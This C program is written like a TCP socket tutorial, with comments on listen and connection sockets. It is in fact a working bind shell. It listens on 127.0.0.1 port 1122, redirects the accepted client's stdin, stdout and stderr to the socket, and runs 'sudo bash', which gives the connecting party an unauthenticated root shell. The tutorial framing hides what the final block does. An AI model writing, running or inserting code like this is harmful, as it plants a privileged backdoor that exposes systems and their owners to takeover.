#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

/**
 * TCP Uses 2 types of sockets, the connection socket and the listen socket.
 * The Goal is to separate the connection phase from the data exchange phase.
 * */

#define TCP_PORT	1122

int main(int argc, char *argv[]) {

	// socket address used for the server
	struct sockaddr_in server_address;
	memset(&server_address, 0, sizeof(server_address));
	server_address.sin_family = AF_INET;

	// htons: host to network short: transforms a value in host byte
	// ordering format to a short value in network byte ordering format
	server_address.sin_port = htons(TCP_PORT);

	// htonl: host to network long: same as htons but to long
	server_address.sin_addr.s_addr = inet_addr("127.0.0.1");

	// create a TCP socket, creation returns -1 on failure
	int listen_sock;
	if ((listen_sock = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
		printf("could not create listen socket\n");
		return 1;
	}

	// bind it to listen to the incoming connections on the created server
	// address, will return -1 on error
	if ((bind(listen_sock, (struct sockaddr *)&server_address,
	          sizeof(server_address))) < 0) {
		printf("could not bind socket\n");
		return 1;
	}

	int wait_size = 16;  // maximum number of waiting clients, after which
	                     // dropping begins
	if (listen(listen_sock, wait_size) < 0) {
		printf("could not open socket for listening\n");
		return 1;
	}

	// socket address used to store client address
	struct sockaddr_in client_address;
	int client_address_len = 0;

	// run indefinitely
	while (true) {
		// open a new socket to transmit data per connection
		int sock;
		int in;
		int out;
		int err;
		int status;
		pid_t child;

		if ((sock =
		         accept(listen_sock, (struct sockaddr *)&client_address,
		                &client_address_len)) < 0) {
			printf("could not open a socket to accept data\n");
			return 1;
		}

		printf("client connected with ip address: %s\n",
		       inet_ntoa(client_address.sin_addr));

		//Everything has been redirected to the shell
		err = dup(fileno(stderr));
		in 	= dup2(sock, fileno(stdin));
		if(close(sock) != 0)
			printf("Error while closing socket %d\n", sock);

		out = dup2(in, fileno(stdout));
		err = dup2(in, fileno(stderr));

		child = fork();
		// the child
		if(!child)
			execlp( "sudo", "sudo", "bash", NULL );

		wait(&status);
		close(listen_sock);
		break;
	}

	return 0;
}
